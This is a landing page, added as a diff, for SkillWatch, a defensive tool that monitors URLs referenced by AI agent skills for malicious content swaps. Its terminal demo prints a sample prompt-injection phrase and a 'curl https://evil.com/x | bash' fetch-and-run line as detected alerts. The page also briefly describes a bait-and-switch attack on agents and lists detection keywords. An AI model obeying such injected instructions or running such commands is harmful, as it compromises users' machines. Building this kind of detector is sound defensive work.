@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SkillWatch — Continuous URL Monitoring for AI Agent Skills and MCP Tools</title>
+<meta name="description" content="Free, open-source CLI tool that monitors external URLs referenced by AI agent skills and MCP tools for bait-and-switch content changes. 13 detection patterns including multilingual prompt injection, Unicode homoglyphs, and data URI payloads. Complements Snyk Agent Scan and Cisco skill-scanner.">
+<meta name="keywords" content="MCP security, AI agent security, skill security, URL monitoring, bait-and-switch, prompt injection detection, supply chain security, Claude Code, Cursor, Windsurf, open source, ATR, Agent Threat Rules, ClawHavoc, unicode homoglyph, DNS pinning, SSRF protection">
+<meta name="author" content="Kuziva Muzondo">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://kuzivaai.github.io/SkillWatch/">
+
+<!-- Open Graph -->
+<meta property="og:title" content="SkillWatch — AI Agent Skill URL Monitor">
+<meta property="og:description" content="Free CLI tool that watches the URLs your AI skills reference. 13 detection patterns covering 7 languages. Complements Snyk Agent Scan.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://kuzivaai.github.io/SkillWatch/">
+<meta property="og:site_name" content="SkillWatch">
+
+<!-- Twitter Card -->
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SkillWatch — AI Agent Skill URL Monitor">
+<meta name="twitter:description" content="Free CLI tool that watches the URLs your AI skills reference. 13 detection patterns covering 7 languages.">
+
+<!-- Structured Data: SoftwareApplication -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "SkillWatch",
+  "applicationCategory": "SecurityApplication",
+  "applicationSubCategory": "AI Agent Security",
+  "operatingSystem": "Linux, macOS, Windows",
+  "programmingLanguage": "Python",
+  "softwareVersion": "0.2.0",
+  "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" },
+  "description": "Continuous URL content monitoring for AI agent skills and MCP tools. Detects bait-and-switch attacks with 13 pattern detectors covering prompt injection in 7 languages, Unicode homoglyphs, data URI payloads, and more.",
+  "url": "https://github.com/kuzivaai/SkillWatch",
+  "downloadUrl": "https://pypi.org/project/skillwatch/",
+  "license": "https://www.apache.org/licenses/LICENSE-2.0",
+  "author": { "@type": "Person", "name": "Kuziva Muzondo" },
+  "datePublished": "2026-07-01",
+  "featureList": [
+    "13 suspicious pattern detectors",
+    "Prompt injection detection in 7 languages (English, German, Spanish, French, Arabic, Russian, Serbian/Croatian)",
+    "32 ATR-derived prompt injection patterns",
+    "Unicode homoglyph detection via Unicode Consortium confusables database",
+    "SSRF protection with DNS pinning",
+    "JSON output for CI/CD and webhook integration",
+    "Built-in ignore presets for false positive reduction",
+    "Zero infrastructure cost"
+  ]
+}
+</script>
+
+<!-- Structured Data: FAQPage (GEO optimisation for AI citation) -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "FAQPage",
+  "mainEntity": [
+    {
+      "@type": "Question",
+      "name": "What is SkillWatch?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "SkillWatch is a free, open-source Python CLI tool that monitors the external URLs referenced by AI agent skills and MCP tools. It detects when URL content changes from legitimate documentation to malicious instructions (bait-and-switch attacks). It runs locally, costs nothing, and stores everything in a local SQLite database."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "How does SkillWatch differ from Snyk Agent Scan and MCP-Scan?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Snyk Agent Scan and MCP-Scan monitor skill code, metadata, and tool descriptions. SkillWatch monitors the content at the external URLs those skills reference. These are different layers of the attack surface. In June 2026, security researchers demonstrated that a skill could pass all static scanners while its referenced URL was swapped to malicious content. SkillWatch detects this specific attack vector. It complements existing scanners, it does not replace them."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "What does SkillWatch detect?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "SkillWatch has 13 detection patterns: execution commands (curl, pip install, eval), prompt injection in 7 languages (32 patterns derived from ATR Agent Threat Rules), suspicious HTML (scripts, iframes, data URI embeds), Unicode homoglyph characters, credential harvesting keywords, new domain references, major content deletions, meta refresh redirects, base64 payloads, and hidden content. All HTML checks are diff-based to avoid false positives."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "How do I install SkillWatch?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Install with pip: pip install skillwatch. Requires Python 3.10 or higher. Five dependencies, all permissively licensed (Apache/MIT/BSD). Zero infrastructure cost — runs on your laptop."
+      }
+    }
+  ]
+}
+</script>
+
+<style>
+:root {
+  --navy: #1B3A5C;
+  --blue: #2D5F8A;
+  --light: #F2F6FA;
+  --text: #2D3748;
+  --muted: #5A6577;
+  --border: #E2E8F0;
+  --success: #38A169;
+  --warning: #D69E2E;
+  --critical: #E53E3E;
+  --mono: 'SF Mono', Monaco, 'Cascadia Code', 'Fira Code', Consolas, monospace;
+}
+*,*::before,*::after { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif; color: var(--text); line-height: 1.65; -webkit-font-smoothing: antialiased; }
+a { color: var(--blue); text-decoration: none; }
+a:hover { text-decoration: underline; }
+a:focus-visible { outline: 2px solid var(--blue); outline-offset: 2px; }
+
+/* Skip link */
+.skip-link { position: absolute; top: -100%; left: 1rem; padding: 0.5rem 1rem; background: var(--navy); color: white; border-radius: 4px; z-index: 100; font-size: 0.875rem; }
+.skip-link:focus { top: 0.5rem; }
+
+/* Hero */
+.hero { background: linear-gradient(135deg, var(--navy) 0%, #243B55 100%); color: white; padding: 4.5rem 1.5rem 3.5rem; text-align: center; }
+.hero h1 { font-size: clamp(2rem, 5vw, 3rem); font-weight: 700; margin-bottom: 0.75rem; letter-spacing: -0.02em; }
+.hero .tagline { font-size: clamp(1rem, 2.5vw, 1.2rem); opacity: 0.88; max-width: 640px; margin: 0 auto 2rem; }
+.hero-ctas { display: flex; gap: 0.75rem; justify-content: center; flex-wrap: wrap; align-items: center; margin-bottom: 1.5rem; }
+.hero code { background: rgba(255,255,255,0.12); border: 1px solid rgba(255,255,255,0.2); padding: 0.65rem 1.4rem; border-radius: 6px; font-size: 0.95rem; font-family: var(--mono); user-select: all; cursor: text; }
+.hero .btn-secondary { display: inline-block; background: transparent; color: white; border: 1px solid rgba(255,255,255,0.4); padding: 0.6rem 1.4rem; border-radius: 6px; font-weight: 500; font-size: 0.95rem; transition: background 0.15s; }
+.hero .btn-secondary:hover { background: rgba(255,255,255,0.1); text-decoration: none; }
+.hero .meta { font-size: 0.8rem; opacity: 0.6; margin-top: 0.5rem; }
+
+/* Container */
+.container { max-width: 920px; margin: 0 auto; padding: 0 1.5rem; }
+
+/* Problem section */
+.problem { background: var(--light); padding: 3.5rem 1.5rem; }
+.problem h2 { color: var(--navy); font-size: 1.5rem; margin-bottom: 1.25rem; text-align: center; }
+.problem p { max-width: 720px; margin: 0 auto 1rem; color: var(--muted); font-size: 1rem; }
+.problem strong { color: var(--text); }
+
+/* Terminal demo */
+.terminal { background: #1a1a2e; color: #a8b2c1; border-radius: 8px; padding: 0; max-width: 700px; margin: 2rem auto 0; font-family: var(--mono); font-size: 0.82rem; line-height: 1.7; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.15); }
+.terminal-bar { background: #2a2a3e; padding: 0.5rem 0.75rem; display: flex; gap: 6px; align-items: center; }
+.terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
+.terminal-dot.r { background: #ff5f57; }
+.terminal-dot.y { background: #febc2e; }
+.terminal-dot.g { background: #28c840; }
+.terminal-body { padding: 1rem 1.25rem; overflow-x: auto; }
+.terminal-body .prompt { color: #7ec699; }
+.terminal-body .cmd { color: #e2e8f0; }
+.terminal-body .ok { color: #7ec699; }
+.terminal-body .warn { color: #f0c040; }
+.terminal-body .crit { color: #ff6b6b; }
+.terminal-body .dim { color: #5a6577; }
+
+/* Features */
+.features { padding: 3.5rem 1.5rem; }
+.features h2 { color: var(--navy); font-size: 1.5rem; margin-bottom: 0.5rem; text-align: center; }
+.features .subtitle { text-align: center; color: var(--muted); margin-bottom: 2rem; font-size: 0.95rem; }
+.grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 1.25rem; max-width: 920px; margin: 0 auto; }
+.card { background: var(--light); border-radius: 8px; padding: 1.25rem 1.35rem; border-left: 3px solid var(--border); transition: border-color 0.15s; }
+.card:hover { border-left-color: var(--blue); }
+.card h3 { color: var(--navy); font-size: 0.95rem; margin-bottom: 0.4rem; font-weight: 600; }
+.card p { font-size: 0.875rem; color: var(--muted); }
+.card .severity { display: inline-block; font-size: 0.7rem; font-weight: 600; padding: 0.15rem 0.45rem; border-radius: 3px; text-transform: uppercase; letter-spacing: 0.03em; margin-bottom: 0.35rem; }
+.card .severity.crit { background: #FED7D7; color: var(--critical); }
+.card .severity.warn { background: #FEFCBF; color: var(--warning); }
+
+/* Quick start */
+.quickstart { padding: 3.5rem 1.5rem; background: var(--light); }
+.quickstart h2 { color: var(--navy); font-size: 1.5rem; margin-bottom: 1.25rem; text-align: center; }
+.quickstart pre { background: #1a1a2e; color: #a8b2c1; padding: 1.25rem 1.5rem; border-radius: 8px; font-family: var(--mono); font-size: 0.82rem; line-height: 1.8; max-width: 700px; margin: 0 auto; overflow-x: auto; }
+.quickstart pre .comment { color: #5a6577; }
+.quickstart pre .cmd { color: #e2e8f0; }
+
+/* Comparison */
+.comparison { padding: 3.5rem 1.5rem; }
+.comparison h2 { color: var(--navy); font-size: 1.5rem; margin-bottom: 0.5rem; text-align: center; }
+.comparison .subtitle { text-align: center; color: var(--muted); margin-bottom: 1.5rem; font-size: 0.95rem; }
+.comparison table { width: 100%; max-width: 800px; margin: 0 auto; border-collapse: collapse; font-size: 0.875rem; }
+.comparison th { background: var(--navy); color: white; padding: 0.65rem 1rem; text-align: left; font-weight: 600; }
+.comparison td { padding: 0.6rem 1rem; border-bottom: 1px solid var(--border); }
+.comparison tr:nth-child(even) { background: var(--light); }
+.comparison .yes { color: var(--success); font-weight: 600; }
+.comparison .no { color: var(--muted); }
+.comparison .partial { color: var(--warning); font-weight: 500; }
+
+/* CTA */
+.cta { background: linear-gradient(135deg, var(--navy) 0%, #243B55 100%); color: white; padding: 3.5rem 1.5rem; text-align: center; }
+.cta h2 { font-size: 1.5rem; margin-bottom: 0.75rem; }
+.cta p { opacity: 0.8; margin-bottom: 1.75rem; max-width: 500px; margin-left: auto; margin-right: auto; }
+.cta .btn { display: inline-block; background: white; color: var(--navy); padding: 0.75rem 2rem; border-radius: 6px; font-weight: 600; font-size: 1rem; transition: background 0.15s; }
+.cta .btn:hover { background: var(--light); text-decoration: none; }
+
+/* Footer */
+footer { padding: 2rem 1.5rem; text-align: center; color: var(--muted); font-size: 0.82rem; border-top: 1px solid var(--border); }
+footer a { color: var(--muted); }
+
+/* Responsive */
+@media (max-width: 600px) {
+  .grid { grid-template-columns: 1fr; }
+  .hero { padding: 3rem 1rem 2.5rem; }
+  .comparison table { font-size: 0.78rem; }
+  .comparison th, .comparison td { padding: 0.45rem 0.6rem; }
+  .terminal-body { font-size: 0.72rem; }
+}
+</style>
+</head>
+<body>
+
+<a href="#main" class="skip-link">Skip to content</a>
+
+<main id="main">
+
+<!-- Hero -->
+<section class="hero" aria-label="Introduction">
+  <h1>SkillWatch</h1>
+  <p class="tagline">Monitors the URLs your AI agent skills reference. Alerts you when their content changes to something suspicious.</p>
+  <div class="hero-ctas">
+    <code>pip install skillwatch</code>
+    <a href="https://github.com/kuzivaai/SkillWatch" class="btn-secondary" aria-label="View SkillWatch on GitHub">GitHub</a>
+  </div>
+  <p class="meta">Python 3.10+ &middot; 5 dependencies &middot; Apache 2.0 &middot; v0.2.0</p>
+</section>
+
+<!-- Problem -->
+<section class="problem" aria-label="The problem SkillWatch solves">
+  <div class="container">
+    <h2>The problem</h2>
+    <p>AI agent skills point to external URLs for setup instructions and documentation. Static scanners like <strong>Snyk Agent Scan</strong> and <strong>Cisco skill-scanner</strong> check those skills once, at install time.</p>
+    <p>But the URLs can change afterwards. In June 2026, <strong>security researchers demonstrated</strong> that a fake skill could bypass every major scanner by keeping its code clean while swapping the URL content from legitimate docs to malicious instructions after distribution.</p>
+    <p><strong>SkillWatch watches those URLs continuously.</strong> It is the only free tool that does this. It complements existing scanners; it does not replace them.</p>
+
+    <!-- Terminal demo -->
+    <div class="terminal" role="img" aria-label="Terminal output showing SkillWatch detecting a suspicious change">
+      <div class="terminal-bar"><div class="terminal-dot r"></div><div class="terminal-dot y"></div><div class="terminal-dot g"></div></div>
+      <div class="terminal-body">
+<span class="prompt">$</span> <span class="cmd">skillwatch add SKILL.md</span>
+<br><span class="dim">  Added 3 URL(s) from SKILL.md</span>
+<br><br><span class="prompt">$</span> <span class="cmd">skillwatch scan --preset docs</span>
+<br><br><span class="dim">  Scanning 3 URLs...</span>
+<br><br><span class="ok">  OK</span>   <span class="dim">https://docs.example.com/setup</span>
+<br><span class="ok">  OK</span>   <span class="dim">https://cdn.example.com/config.yaml</span>
+<br><span class="crit">  !!</span>   <span class="cmd">https://skills.example.com/install</span>
+<br><span class="dim">       </span><span class="crit">prompt_injection</span> <span class="dim">(critical)</span> <span class="warn">Ignore all previous instructions</span>
+<br><span class="dim">       </span><span class="crit">new_exec_command</span> <span class="dim">(critical)</span> <span class="warn">curl https://evil.com/x | bash</span>
+<br><br><span class="dim">  Scanned 3 URLs: </span><span class="ok">2 unchanged</span> <span class="crit">1 changed (2 alerts)</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Features -->
+<section class="features" aria-label="Detection patterns">
+  <h2>13 detection patterns, zero infrastructure</h2>
+  <p class="subtitle">All checks are diff-based: only newly introduced content triggers alerts.</p>
+  <div class="grid">
+    <article class="card">
+      <span class="severity crit">Critical</span>
+      <h3>Prompt injection</h3>
+      <p>32 ATR-derived patterns covering 7 languages (EN, DE, ES, FR, AR, RU, SR/HR) plus base64, zero-width, and spaced-letter obfuscation.</p>
+    </article>
+    <article class="card">
+      <span class="severity crit">Critical</span>
+      <h3>Exec commands</h3>
+      <p>Flags new curl, wget, pip install, eval(), subprocess, powershell, and node -e commands in changed content.</p>
+    </article>
+    <article class="card">
+      <span class="severity crit">Critical</span>
+      <h3>Data URI embeds</h3>
+      <p>Detects new iframes, embeds, and objects with data: URI payloads containing HTML or JavaScript.</p>
+    </article>
+    <article class="card">
+      <span class="severity warn">Warning</span>
+      <h3>Unicode homoglyphs</h3>
+      <p>Catches Cyrillic, Greek, Armenian, and other script characters imitating Latin letters. Uses Unicode Consortium's official confusables database.</p>
+    </article>
+    <article class="card">
+      <span class="severity warn">Warning</span>
+      <h3>Credential harvesting</h3>
+      <p>Alerts on new references to api_key, token, password, .env, private_key, and other secret keywords.</p>
+    </article>
+    <article class="card">
+      <span class="severity warn">Warning</span>
+      <h3>HTML injection</h3>
+      <p>Detects new suspicious scripts (eval, fetch, cookie access), iframes, meta refresh redirects, and hidden elements.</p>
+    </article>
+  </div>
+</section>
+
+<!-- Quick start -->
+<section class="quickstart" aria-label="Quick start guide">
+  <h2>Quick start</h2>
+  <pre><span class="comment"># Install</span>
+<span class="cmd">pip install skillwatch</span>
+
+<span class="comment"># Add URLs from a SKILL.md file</span>
+<span class="cmd">skillwatch add path/to/SKILL.md</span>
+
+<span class="comment"># Run a scan</span>
+<span class="cmd">skillwatch scan</span>
+
+<span class="comment"># Check alerts</span>
+<span class="cmd">skillwatch alerts</span>
+
+<span class="comment"># Automate (every 4 hours via cron)</span>
+<span class="cmd">0 */4 * * * skillwatch scan --quiet --preset docs</span>
+
+<span class="comment"># JSON output for webhooks, Slack, ntfy.sh</span>
+<span class="cmd">skillwatch scan --output json | curl -d @- ntfy.sh/alerts</span></pre>
+</section>
+
+<!-- Comparison -->
+<section class="comparison" aria-label="Comparison with other tools">
+  <h2>How SkillWatch fits in</h2>
+  <p class="subtitle">SkillWatch monitors a different layer than existing scanners. Use them together.</p>
+  <table>
+    <thead>
+      <tr>
+        <th>Capability</th>
+        <th>Snyk Agent Scan</th>
+        <th>Cisco skill-scanner</th>
+        <th>SkillWatch</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Scans skill code/metadata</td>
+        <td class="yes">Yes</td>
+        <td class="yes">Yes</td>
+        <td class="no">No</td>
+      </tr>
+      <tr>
+        <td>Monitors URL content changes</td>
+        <td class="no">No</td>
+        <td class="no">No</td>
+        <td class="yes">Yes</td>
+      </tr>
+      <tr>
+        <td>Continuous monitoring</td>
+        <td class="partial">Enterprise only</td>
+        <td class="no">No</td>
+        <td class="yes">Yes (cron)</td>
+      </tr>
+      <tr>
+        <td>Prompt injection detection</td>
+        <td class="yes">Yes (backend)</td>
+        <td class="yes">Yes (YARA+LLM)</td>
+        <td class="yes">Yes (32 patterns, 7 languages)</td>
+      </tr>
+      <tr>
+        <td>Free for individuals</td>
+        <td class="yes">Yes</td>
+        <td class="yes">Yes</td>
+        <td class="yes">Yes</td>
+      </tr>
+      <tr>
+        <td>JSON output</td>
+        <td class="yes">Yes</td>
+        <td class="no">No</td>
+        <td class="yes">Yes</td>
+      </tr>
+      <tr>
+        <td>Runs fully offline</td>
+        <td class="no">No</td>
+        <td class="yes">Yes</td>
+        <td class="yes">Yes</td>
+      </tr>
+    </tbody>
+  </table>
+</section>
+
+<!-- CTA -->
+<section class="cta" aria-label="Get started">
+  <h2>Free, open source, runs on your laptop</h2>
+  <p>Five dependencies. Zero infrastructure. Nothing sent externally. Apache 2.0.</p>
+  <a href="https://github.com/kuzivaai/SkillWatch" class="btn">View on GitHub</a>
+</section>
+
+</main>
+
+<footer>
+  <p>SkillWatch v0.2.0 &middot; <a href="https://github.com/kuzivaai/SkillWatch">GitHub</a> &middot; <a href="https://pypi.org/project/skillwatch/">PyPI</a> &middot; Apache 2.0</p>
+</footer>
+
+</body>
+</html>
